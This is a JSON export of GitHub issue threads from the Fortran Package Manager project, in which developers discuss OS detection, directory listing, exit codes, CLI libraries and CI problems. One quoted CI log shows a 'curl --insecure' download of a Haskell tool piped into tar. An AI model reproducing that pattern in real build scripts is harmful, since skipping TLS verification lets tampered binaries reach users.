                    "text": "No worries! I am sure we'll have another development meeting soon.\n\u2026\nOn Wed, Jul 29, 2020, at 12:41 AM, Arjen Markus wrote:\n\n\n Hi Ondrej, all,\n\n sorry I missed the meeting - I was home rather late and I did not see any\n message with a link to the meeting ;). I will try and catch up with the\n material so far.\n\n Regards,\n\n Arjen\n\n Op di 28 jul. 2020 om 23:13 schreef Ond\u0159ej \u010cert\u00edk ***@***.***\n >:\n\n > Summary of our meeting:\n >\n > - Looks like we all agreed on the general design above.\n > - We discussed some details such as:\n > - How to test this: integration tests vs unit tests, vs integration\n > tests with specific features to test. We will iterate as we go. We can use\n > Vegetables for unit testing.\n > - How to link C dependencies: include the linking information in\n > the Model, backend links\n > - The Model includes everything, including command line options\n > - Allow the Model to print to the screen (for testing and\n > informational purposes)\n > - That it is probably a good idea as a start to download all\n > dependencies and figure out a Model that includes all the dependencies, and\n > only then pass it over to the backend. Later we can investigate whether the\n > backend cannot start building some files speculatively sooner.\n > - Step forward: refactor our current fpm to follow the design above:\n > construct a Model, pass it to the backend.\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub\n > <#146 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAN6YRZLWWNL4YBLV3QGJIDR545PVANCNFSM4PFDFI3Q>\n > .\n >\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#146 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWBXYJLYFELAQTY7UT3R57AAHANCNFSM4PFDFI3Q>."
                }
            ]
        },
        {
            "number": 145,
            "user": "certik",
            "date": "2020-07-22 20:10:35+00:00",
            "title": "Read the source files automatically",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 20:43:05+00:00",
                    "text": "This obviously needs a lot more testing, but as a proof of concept it's good enough. It reads the files from the src/ directory if it exists and builds them. It seems to work on all platforms. Still no module dependency resolution."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 21:30:42+00:00",
                    "text": "I rebased on top of the latest master to simplify the history."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 22:17:30+00:00",
                    "text": "Thanks for the review. Merging."
                }
            ]
        },
        {
            "number": 144,
            "user": "certik",
            "date": "2020-07-22 15:03:08+00:00",
            "title": "fpm should detect operating system",
            "text": "Given the issues in #141 to determine the OS type, I think the most robust is to do it like CMake: fpm will detect / know the operating system that it is on, and it will pass this information down the source files, for example in terms of macro definitions, such as:\n\nFPM_OS_LINUX\nFPM_OS_MACOS\nFPM_OS_WINDOWS\n\nOr something like that. We might be even more specific than that if needed. This seems to be the most robust and cross-platform way to do it that will work with all Fortran compilers.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 15:11:20+00:00",
                    "text": "I tried various ways using macros in #142, and none of them seem to work with gfortran. So that's why I think having fpm define those macros is the way to go."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 15:16:58+00:00",
                    "text": "Right, so if fpm itself can detect the operating system, what do you need the macros for? I thought the macros are only useful when your software doesn't have the information you need. Or am I missing something?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:23:55+00:00",
                    "text": "It's a chicken and an egg. The fpm implementation in Fortran needs to know the system type so that we know what command to use to get the directory content. The most robust seems to be if the build system (whether cmake or fpm) passes this information in as macro definitions."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 15:31:07+00:00",
                    "text": "Okay, so the bootstrap Haskell fpm will know the OS and pass the macros down to Fortran fpm. Then in the future when you want to bootstrap Fortran fpm using Fortran fpm, then the OS information will already be available in the boostrap Fortran fpm binary. It made me dizzy for a little bit, but I think it works."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:34:47+00:00",
                    "text": "Right. The other way to bootstrap fpm down the road will be via cmake (#123), so the cmake build system that fpm will generate will have to detect the OS type (which cmake knows how to do) and then create the proper FPM_OS_* macro defines."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 11:50:39+00:00",
                    "text": "You could use the commands that come with the operating system (for instance this website gives some indicators.\nWhile this will not be waterproof, the module may simply test the various commands - whichever succeeds is the one we want.\nI can give this a try."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 12:32:31+00:00",
                    "text": "I just tried:\nver in a Windows command box gives the indication of the Windows version\nThis does not work with MinGW or Cygwin, even though they are Windows-based OSes.\nuname -a succeeds on MinGW, Cygwin and Linux with proper indications of all OS types.\nI have no access to MacOS but I imagine that uname -a work fine there as well.\n(Something to check: whether ver is not a haphazard program - for uname I guess /usr/bin/uname is restrictive enough?)"
                },
                {
                    "user": "certik",
                    "date": "2020-07-23 14:59:22+00:00",
                    "text": "Here is how we currently do this using environment variables: \n  \n    \n      fpm/fpm/src/fpm.f90\n    \n    \n         Line 16\n      in\n      6ef2546\n    \n    \n    \n    \n\n        \n          \n           integer function get_os_type() result(r)"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 17:16:20+00:00",
                    "text": "Hm, the environment variable HOMEPATH is set to \"\\Users\\markus\" on my Cygwin and MinGW/w-64 installations. So, with the current procedure that would boil down to \"Windows\"."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-23 17:19:54+00:00",
                    "text": "It looks like we may have to combine the current HOMEPATH query with a ver test suggested by @arjenmarkus if we want to differentiate MinGW or Cygwin from Windows."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 17:23:10+00:00",
                    "text": "Since they represent very different operating environments, I think we\ncannot ignore the difference ;). For instance: \"dir\" does not work under\nCygwin or MinGW.\n\nRegards,\n\nArjen\n\nOp do 23 jul. 2020 om 19:20 schreef Milan Curcic <notifications@github.com>:\n\u2026\n It looks like we may have to combine the current HOMEPATH query with a ver\n test suggested by @arjenmarkus <https://github.com/arjenmarkus> if we\n want to differentiate MinGW or Cygwin from Windows.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#144 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR2ZDUGZDNVZCMXWNUDR5BWMXANCNFSM4PEZSOMQ>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 17:26:10+00:00",
                    "text": "Oops, I was too hasty: \"dir\" does actually work and \"dir -b\" also. But then\n\"dir /b\" does not and, vice versa, under a Windows command box \"dir -b\"\ndoes not work - it looks for a file \"-b\".\n\nRegards,\n\nArjen\n\nOp do 23 jul. 2020 om 19:22 schreef Arjen Markus <arjen.markus895@gmail.com\n\u2026\n:\n Since they represent very different operating environments, I think we\n cannot ignore the difference ;). For instance: \"dir\" does not work under\n Cygwin or MinGW.\n\n Regards,\n\n Arjen\n\n Op do 23 jul. 2020 om 19:20 schreef Milan Curcic ***@***.***\n >:\n\n> It looks like we may have to combine the current HOMEPATH query with a\n> ver test suggested by @arjenmarkus <https://github.com/arjenmarkus> if\n> we want to differentiate MinGW or Cygwin from Windows.\n>\n> \u2014\n> You are receiving this because you were mentioned.\n> Reply to this email directly, view it on GitHub\n> <#144 (comment)>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AAN6YR2ZDUGZDNVZCMXWNUDR5BWMXANCNFSM4PEZSOMQ>\n> .\n>"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-23 17:34:15+00:00",
                    "text": "Right, dir is part of GNU Coreutils, so it works on most Linux systems, but not on macOS for example. Best to stay away from it for making important decisions :)."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-23 18:25:21+00:00",
                    "text": "I have experimented a bit: the attached code correctly identifies the\nfour OSes I have access to. It cannot rely on \"ver\", because that is\nalso supported by MinGW and Cygwin, so instead I use \"uname\". However,\nMinGW gives odd results - /usr/bin/uname was not found (presumably the\ndirectory is not properly substituted). So, it also tries \"uname\"\nwithout the path.\n\nThe executable I created with Intel Fortran gives the right (!)\nidentification under a Windows command box, MinGW and Cygwin. I have\nnot tested the MinGW/Cygwin variants under the others.\n\n(Attaching it to an email was the fastest way, but of course I can\nalso put it in a pull request)\n\nRegards,\n\nArjen\n\nOp do 23 jul. 2020 om 19:34 schreef Milan Curcic <notifications@github.com>:\n\n Right, dir is part of GNU Coreutils, so it works on most Linux systems, but not on macOS for example. Best to stay away from it for making important decisions :).\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub, or unsubscribe.\n! getos.f90 --\n!     Attempt to characterise the operating system\n!\nmodule getos\n    implicit none\n\n    integer, parameter :: OS_WINDOWS = 1\n    integer, parameter :: OS_LINUX   = 2\n    integer, parameter :: OS_MACOS   = 3\n    integer, parameter :: OS_CYGWIN  = 4\n    integer, parameter :: OS_MINGW   = 5\n\ncontains\n\n! get_os --\n!     Identify the operating system\n!\n! Arguments:\n!     None\n!\n! Note:\n!     Linux is used as the fallback option. Should we distinguish this from a positive identification?\n!\ninteger function get_os()\n    character(len=80) :: val\n    character(len=20) :: os_id\n    integer           :: lun\n    integer           :: stat\n\n    !\n    ! Try the environment variable\n    !\n    call get_environment_variable( \"HOMEPATH\", val, status = stat )\n\n    if ( stat == 0 .and. val(1:7) == \"\\Users\\\" ) then\n        !\n        ! We may be on Windows, probably, but what flavour? Windows, Cygwin or MinGW?\n        !\n        ! First try \"uname\"\n        !\n        ! Note: MinGW gives an error when using the full path ...\n        !\n        call execute_command_line( \"/usr/bin/uname -a > fpm_tmp.out 2>&1\", exitstat = stat )\n        if ( stat /= 0 ) then\n            call execute_command_line( \"uname -a > fpm_tmp.out 2>&1\", exitstat = stat )\n        endif\n\n        if ( stat /= 0 ) then\n            !\n            ! This seems to be Windows\n            !\n            get_os = OS_WINDOWS\n        else\n            open( newunit = lun, file = \"fpm_tmp.out\" )\n            read( lun, * ) os_id\n            close( lun, status = 'delete' )\n\n            get_os = merge( OS_CYGWIN, OS_MINGW, os_id(1:6) == 'CYGWIN' )\n        endif\n    else\n        !\n        ! We are on Linux or MacOS\n        !\n        call get_environment_variable( \"HOME\", val, status = stat )\n\n        if ( stat == 0 ) then\n            if ( val(1:7) == \"/Users/\" ) then\n                get_os = OS_MACOS\n            else\n                get_os = OS_LINUX\n            endif\n        else\n            !\n            ! Use Linux as fallback option\n            !\n            get_os = OS_LINUX\n        endif\n    endif\nend function get_os\n\nend module getos\n\n! test ...\n!\nprogram test_get_os\n    use getos\n\n    integer :: id\n\n    character(len=10), dimension(5) :: os_identification = &\n        ['Windows   ', 'Linux     ', 'MacOS     ', 'Cygwin    ', 'MinGW     ']\n\n    id = get_os()\n    write(*,*) id, os_identification(id)\n\nend program test_get_os"
                },
                {
                    "user": "certik",
                    "date": "2020-07-23 23:37:46+00:00",
                    "text": "Thanks @arjenmarkus, much appreciated. We should incorporate this into fpm."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 11:31:05+00:00",
                    "text": "Done with #162"
                }
            ]
        },
        {
            "number": 143,
            "user": "certik",
            "date": "2020-07-22 14:41:32+00:00",
            "title": "`fpm run` does not propagate exit code",
            "text": "fpm run does not return with error if the program fails, as can be checked by:\n$ fpm run && echo \"OK\"\nERROR STOP \n\nError termination. Backtrace:\n#0  0x7ff9ae8262ed in ???\n#1  0x7ff9ae826ed5 in ???\n#2  0x7ff9ae827f86 in ???\n#3  0x55ee5e99e013 in get_os\n\tat src/fpm.F90:22\n#4  0x55ee5e99df25 in __fpm_MOD_print_help\n\tat src/fpm.F90:28\n#5  0x55ee5e99daa2 in MAIN__\n\tat app/main.f90:7\n#6  0x55ee5e99dc43 in main\n\tat app/main.f90:2\nOK\n\nThis causes CI tests to pass even though they should fail, e.g.:\nhttps://github.com/fortran-lang/fpm/pull/142/checks?check_run_id=897192409\nwhich should have failed, but happily continues:\n...\n# gfortran (for build/gfortran_debug/app/main.o)\n# gfortran (for build/gfortran_debug/app/fpm)\n+ fpm run\nERROR STOP \n\nError termination. Backtrace:\n#0  0x7fc9615aaaed in ???\n#1  0x7fc9615ab605 in ???\n#2  0x7fc9615acc93 in ???\n#3  0x55b23ed92014 in get_os\n\tat src/fpm.F90:22\n#4  0x55b23ed91f21 in __fpm_MOD_print_help\n\tat src/fpm.F90:28\n#5  0x55b23ed91a7d in MAIN__\n\tat app/main.f90:7\n#6  0x55b23ed91c28 in main\n\tat app/main.f90:2\n+ fpm run --args build\n # Building project\n + gfortran -c src/fpm.F90 -o fpm.o\n + gfortran -c app/main.f90 -o main.o\n...\n\nThis is quite high priority, as we need our CI to be reliable with regards to these things.\n@everythingfunctional do you  know how to fix it?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-23 16:34:48+00:00",
                    "text": "I see. I expected the function used to run external commands to propagate that automatically, but I guess I was wrong. It should just be a matter of catching the return status and manually doing something with it. I should have some time to look into it this weekend."
                }
            ]
        },
        {
            "number": 142,
            "user": "certik",
            "date": "2020-07-22 05:24:08+00:00",
            "title": "Initial implementation of get_os()",
            "text": "It might be difficult to get this working via pre-processor.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 14:43:10+00:00",
                    "text": "This PR actually fails tests, but they look like they passed due to #143."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:07:46+00:00",
                    "text": "@milancurcic the tests are currently failing, even though they are green. The macros do not work, if you click on the output when we just run fpm, you can see that you get a stacktrace and \"error stop\"."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:09:06+00:00",
                    "text": "The latest commit prints os type 1 (Linux) on all platforms. Ok, I think the macros do not work at all. I am going to use an alternative implementation using environment variables."
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-22 15:28:47+00:00",
                    "text": "The latest commit prints os type 1 (Linux) on all platforms. Ok, I think the macros do not work at all. I am going to use an alternative implementation using environment variables.\n\nHow did you pass the macro to gfortran? as -DFMP_OS_xxxx?"
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-22 15:39:56+00:00",
                    "text": "The latest commit prints os type 1 (Linux) on all platforms. Ok, I think the macros do not work at all. I am going to use an alternative implementation using environment variables.\n\nIf it could help, fpp and macros seem to work when compiling manually:\n gfortran -cpp -D_WIN32 fpm.F90\n$ ./a.out \n Fortran Package Manager (fpm)\n OS Type:            3"
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:44:36+00:00",
                    "text": "@jvdp1 the issue is that those macros do not seem to be defined by default on any platform with gfortran (and obviously we need to support all Fortran compilers down the road, each defining slightly different macros).\nThe current solution as of (a1dc068) seems to work. It's obviously not super robust, but it will get us started, and we can design the correct full solution in #144."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 15:53:53+00:00",
                    "text": "Everything works except Windows. It just occurred tome that if $HOME doesn't exist, then we can assume Windows. I am going to rework it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 16:05:40+00:00",
                    "text": "The problem now is that if a Windows user defines %HOME% for any reason, the function will fail.\nI think the original %HOMEPATH% approach is more robust, but you also need to test the value:\ncall get_environment_variable(\"HOMEPATH\", val, status=stat)\nif (stat == 0 .and. val(1:7) == \"\\Users\\\") then\n    r = OS_WINDOWS\n    return\nend if"
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:16:52+00:00",
                    "text": "So when I first implemented $HOMEPATH for Windows, it failed: https://github.com/fortran-lang/fpm/runs/899185101, but then the later commit which didn't touch it, succeeded: https://github.com/fortran-lang/fpm/runs/899226753. This is infuriating, I spent hours yesterday due to this fragility of the GitHub Actions. I think they sometimes test a previous commit, even though they claim to test the latest commit. This is really bad from a reliability perspective.\nAnyway, the latest commit (only using $HOME) also seems to work, but who know knows if it actually got tested?\nI can put in back the $HOMEPATH if you prefer. This is all fragile and can easily break anyway, if somebody declares HOMEPATH on linux for example."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-22 16:20:49+00:00",
                    "text": "This is all fragile and can easily break anyway, if somebody declares HOMEPATH on linux for example.\n\nYes, but testing for the value (\"\\Users\\\") greatly reduces the chance of collision. I don't think we should excuse the code to be fragile if the CI is already fragile."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:25:46+00:00",
                    "text": "Right. I did it as you suggested, but I just don't know which of the two is more robust (will succeed in more cases):\n\nTest for $HOMEPATH=\\Users\\\nTest that $HOME does not exist\n\nBecause I do not know if $HOMEPATH on Windows can be set to other paths than \\Users\\ quite often, or not. And compared to that how often do users define $HOME on Windows."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:36:14+00:00",
                    "text": "I checked the CI manually, it still seems to work (assuming the CI tested the latest commit). But given the fact that the previous commit seems to work, then if the master fails after this is merged, we can always revert the latest commit.\nThis is ready for a final review and merge as far as I am concerned."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 20:25:06+00:00",
                    "text": "@milancurcic, @everythingfunctional is this ok to go in? I have another PR (#145) that depends on this."
                }
            ]
        },
        {
            "number": 141,
            "user": "certik",
            "date": "2020-07-21 22:04:55+00:00",
            "title": "How to list directory content",
            "text": "In order to move beyond #137, we need a cross-platform way to read all the *.f90 files in a directory. What is the best way to do that in Fortran?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 22:11:27+00:00",
                    "text": "For cross-platform you need this.\nOtherwise, I think the next best kludge would be to call execute_command_line('ls > tmp.txt'), then parse tmp.txt, and equivalent on Windows."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:20:55+00:00",
                    "text": "We need a temporary solution so that we are not stuck on this, and can move on, and in the meantime we can work on the full general solution."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 22:27:50+00:00",
                    "text": "I agree. I think wrapping around the shell commands on each OS is the way to go."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:34:23+00:00",
                    "text": "It seems like it. How do you determine which OS you are on from Fortran?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 22:45:23+00:00",
                    "text": "Perhaps we can test the value of an environment variable (get_environment_variable) that we know will be different between systems? Perhaps HOME, and then detect based on whether the value has forward slashes (Linux and macOS) or backslashes (Windows)? Just an idea, I've never done this myself."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:59:23+00:00",
                    "text": "Good idea, the GET_ENVIRONMENT_VARIABLE intrinsic will do this. That will get us started, and we can make this more robust / general later."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 23:23:50+00:00",
                    "text": "I'd put it behind a function and just use preprocessor directives. Something like:\nfunction is_windows()\n    logical :: is_windows\n\n#ifdef (WIN_32)\n    is_windows = .true.\n#elif\n    is_windows = .false.\n#endif\nObviously you'll need to look up the proper syntax and tests, but that way, even if you change the way it's done, it shouldn't require changing any other code anywhere."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 23:28:01+00:00",
                    "text": "@everythingfunctional ah that's right, I think that should work."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 23:37:52+00:00",
                    "text": "I didn't know fpm supported preprocessing. \ud83d\udc4d in that case."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 23:43:41+00:00",
                    "text": "fpm isn't doing any preprocessing, but our currently only supported compiler does a bit ;). Should be enough to solve at least the \"Is this Windows or not?\" question."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-22 09:00:36+00:00",
                    "text": "I just tried: on Windows \"dir /b\" gives the bare list of file names, just as \"ls\". That means that only the command is different - not the format of the output (with out \"/b\" you get a lot of rubbish ;))."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 14:46:18+00:00",
                    "text": "@everythingfunctional so the ifdef trick does not work with gfortran to determine the OS, I tried that in #142, and it does not work on linux, nor anywhere else... Let's further discuss this OS determination in #144."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 16:31:03+00:00",
                    "text": "Thanks @arjenmarkus. I will try to do this once #142 is merged, as I need to determine the OS type first to know which command to run."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-08 09:27:57+00:00",
                    "text": "Until stdlib can be included, perhaps linking an ISO C binding abstraction layer to either POSIX and Win32 routines at compile time may be sufficient."
                }
            ]
        },
        {
            "number": 140,
            "user": "certik",
            "date": "2020-07-21 21:58:03+00:00",
            "title": "Build hello_world",
            "text": "The build is hardwired, but it works. This is mainly useful to setup our CI.\nOnce we implement a more general solution, we just need to keep our CI passing.\nFixes #137.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 22:10:24+00:00",
                    "text": "Weird. The Linux CI didn't execute the additional lines I added in this PR: https://github.com/fortran-lang/fpm/pull/140/checks?check_run_id=896195075"
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:29:50+00:00",
                    "text": "I extracted the tests into separate files, now they are executed properly. Don't know what the problem was, it looks like a bug at the CI."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:32:55+00:00",
                    "text": "The CI is not executing the latest version of the files at a given commit. That's a bug, which makes it pretty hard to Debug."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 22:56:18+00:00",
                    "text": "It finally works, all tests pass and are executed properly. Hello World test now works on all platforms."
                }
            ]
        },
        {
            "number": 139,
            "user": "certik",
            "date": "2020-07-21 20:13:34+00:00",
            "title": "Minimal `fpm build` implementation",
            "text": "Very minimal fpm build now works, it can only build fpm itself, but it can do it on all platforms, which is nice.\nAfter this is in, the next step is to make it more general and build the hello_world example, and then execute this test also.\nTowards #137.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 21:39:02+00:00",
                    "text": "Finally some code I can contribute! I am going to merge, the change is simple, so I think one positive review is enough."
                }
            ]
        },
        {
            "number": 138,
            "user": "certik",
            "date": "2020-07-21 19:56:40+00:00",
            "title": "`fpm run --args \"a b c\"` should become `fpm run -- a b c`",
            "text": "As in Cargo.\nCurrently you must use \" as in:\nfpm run --args \"a b c\"\n\nRather, one should just do:\nfpm run -- a b c",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 23:29:56+00:00",
                    "text": "I agree, just couldn't figure out how to make that work with the command line parser I was using in Haskell."
                }
            ]
        },
        {
            "number": 137,
            "user": "certik",
            "date": "2020-07-21 19:52:41+00:00",
            "title": "Minimal version working",
            "text": "This minimal version will:\n\ncompile test/example_packages/hello_world\nrun this particular test\n\nTo get this working, we do not need any of the 3rd party packages as listed in #136, we only need to implement fpm build, fpm run, we do not need to read the toml file for now, so we can get it working quite quickly.\nThe main goal is to start testing this as part of our testing. Then later we can swap a proper CLI library, a proper TOML reading library, etc.",
            "comments": []
        },
        {
            "number": 136,
            "user": "certik",
            "date": "2020-07-21 19:45:52+00:00",
            "title": "Roadmap for Fortran implementation",
            "text": "Please see our beta release milestone for the latest roadmap for the Fortran implemetation.\nThis was discussed recently during the October monthly call (fpm-update-october-2020.pdf)",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 20:58:43+00:00",
                    "text": "Fortran interface to curl for http requests: https://github.com/interkosmos/fortran-curl\nIf we end up needing more advanced git stuff than just downloading the code, we can wrap libgit2."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 20:14:28+00:00",
                    "text": "Per my comment in #149 (comment), it seems all of these can in principle be done in pure Fortran, except the internet download of tarballs. For git repositories, we'll just assume that the git executable is installed, as we already do in haskell fpm. To be able to bootstrap fpm easily, we can just have all dependencies as git repositories and assume git is present on all platforms. Then in principle everything can be done in pure Fortran, which I think might be very helpful at least initially.\nThen we can implement robust support for 3rd party non Fortran dependencies in the fortran fpm. Eventually we can then depend on curl or any other library (but if we do for fpm itself, it will always be more challenging to install it from source, say on HPC machines than if every dependency is pure Fortran)."
                },
                {
                    "user": "jacobwilliams",
                    "date": "2020-07-26 19:08:37+00:00",
                    "text": "FYI...somewhere i have a Fortran interface to WinINet that i wrote years ago. I think it was pretty rudimentary but it could be used to download files (on windows only of course). I can dig that up, but maybe you just want to stick with curl on all platforms?"
                }
            ]
        },
        {
            "number": 135,
            "user": "milancurcic",
            "date": "2020-07-21 15:45:53+00:00",
            "title": "Command line interface (CLI)",
            "text": "How to implement the CLI in fpm-fortran? We can use:\n\nIntrinsics command_argument_count and get_command_argument (lowest level, no dependencies)\nFLAP by @szaghi (library, pure Fortran, I've used it a bit with good experience)\nM_cli by @urbanjost (library, pure Fortran, no personal experience with it)\nSome other library I'm not aware of?\n\nI think we should go with a library and both FLAP and M_cli seem to do what we need (positional arguments + optional flags). What do you think?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 15:52:02+00:00",
                    "text": "I would go with FLAP. But we have to make it an fpm package first, so that we can use it as a dependency. Update: that actually might not be as easy without refactoring... Looking at M_cli, it actually seems much easier to create an fpm package out of it. So we might start with M_cli, and then if FLAP can be made an fpm package, we can switch to it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 19:05:56+00:00",
                    "text": "M_cli is already an fpm package (I tried it--it works). However, after reviewing M_cli in more detail, I'm quite strongly in favor of FLAP. It seems more mature and powerful while in my opinion having a simpler API.\n@szaghi would you accept a PR to FLAP that would make it an fpm package? We'd make sure that your existing build systems  (CMake, Make, Fobis) still work. This would require adding an fpm.toml file to the top-level directory, and some adjustments to module names or source file names, but otherwise it would be backward compatible from user's point of view. Best part, it would make FLAP part of a rapidly growing fpm ecosystem of packages."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-21 19:33:31+00:00",
                    "text": "I haven't had a chance to look at either of the libraries, but that is definitely the way to go. We need to do whatever can help us bootstrap this faster.\nNote: the command line for fpm is quite complicated; subcommands, flags that are only applicable for a subset of them, some flags which may be mutually exclusive, etc.\nI think the first step, before we start implementing the command line interface is to clearly spec it out. Then we can pick a library and start implementing."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-21 19:59:02+00:00",
                    "text": "I am aware of two more libraries for command line interfaces:\n\ncommand_args from @arjenmarkus\nFTN_Getopt by Reinhold Bader (author of FGSL). I like the simplicity of this one (it is a single module). Unfortunately, the source code is not publicly available at the moment. I have a copy of the code and the author has indicated to me I can share it under GPL and the condition of preserving the authorship."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 20:18:30+00:00",
                    "text": "I would like all fpm dependencies to be MIT or BSD licensed, because we are linking everything statically into one executable, so GPL (and even LGPL) would prohibit us to license fpm under the MIT license."
                },
                {
                    "user": "jvdp1",
                    "date": "2020-07-21 20:24:29+00:00",
                    "text": "Wouldn't it be useful to integrate such a library first (or simultaneously) in stdlib?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-21 20:24:39+00:00",
                    "text": "One more library I learned of recently is libSUFR (libSUFR is a library containing Some Useful Fortran Routines). It is also GPL.\nThe M_cli module from @urbanjost is licensed under the Unlicense.\nThe way I understand the licensing system of FLAP:\n\nfor FOSS projects:\n    GPL v3;\nfor closed source/commercial projects:\n    BSD 2-Clause;\n    BSD 3-Clause;\n    MIT.\n\n\nfpm would count as a FOSS project, since the source is public. Am I correct?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 20:31:51+00:00",
                    "text": "fpm would count as a FOSS project, since the source is public. Am I correct?\n\nI think that strictly only GPL family of software is FOSS. We are just OSS :)\nI'm pretty sure that @szaghi meant \"use whatever license you want\". He can confirm this."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 20:32:58+00:00",
                    "text": "@jvdp1 yes, stdlib should have basic command line parsing, just like Python has it. But we can wait with stdlib's integration until we get more experience what API makes the most sense."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-07-21 20:47:13+00:00",
                    "text": "Just as an alternative idea, we could also wrap one of the many existing C and C++ libraries:\n\ndocopt.c, docopt.cpp\ncommander\nCLI11 (I noticed @certik is a contributor \ud83d\udc4d ) Edit: It also has a partial TOML parser.\ncxxopts\n\nI think with the current Haskell version of fpm this would require a custom Makefile."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 21:42:07+00:00",
                    "text": "Yes, I investigated all options for C++, and most of them work, and I settled with using CLI11 for LFortran. Works great."
                }
            ]
        },
        {
            "number": 134,
            "user": "certik",
            "date": "2020-07-21 15:36:57+00:00",
            "title": "Haskell fails to install on macOS at our CI",
            "text": "The error is:\nRun curl --insecure -L https://get.haskellstack.org/stable/osx-x86_64.tar.gz | tar xz --strip-components=1 --include '*/stack' -C /Users/runner/.local/bin\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\ncurl: (35) Server aborted the SSL handshake\n\nSee e.g. https://github.com/fortran-lang/fpm/pull/131/checks?check_run_id=894840007",
            "comments": []
        },
        {
            "number": 133,
            "user": "milancurcic",
            "date": "2020-07-21 15:34:59+00:00",
            "title": "Draft an fpm specification",
            "text": "I want us to get started on the specification document. It would describe the expected behavior of fpm. It wouldn't be a user documentation, although users could use it to diagnose fpm bugs. A spec would help define much needed tests that would catch various recently reported unhandled exceptions.\nRather than us writing a spec and then an implementation following that spec, I think the spec should evolve side-by-side as we implement and discover the preferred ways to do things. So it will very much be a living document.\nI'm happy to start the first draft. In this issue, I'm merely asking for thumbs up if you agree, and if not let me know why.\n@certik @everythingfunctional @LKedward @arjenmarkus @smeskos",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-21 16:08:21+00:00",
                    "text": "If it was me, I would be fine with the spec simply being the tests themselves. But I am not against having a separate document also, but in either case, from a practical perspective, we need the tests for sure. That is how we will ensure that the Haskell and Fortran versions actually work."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-21 17:30:50+00:00",
                    "text": "I agree about tests, but to write tests you need to know the expected behavior of the program. Writing a spec would force us to get clear on the expected behavior."
                },
                {
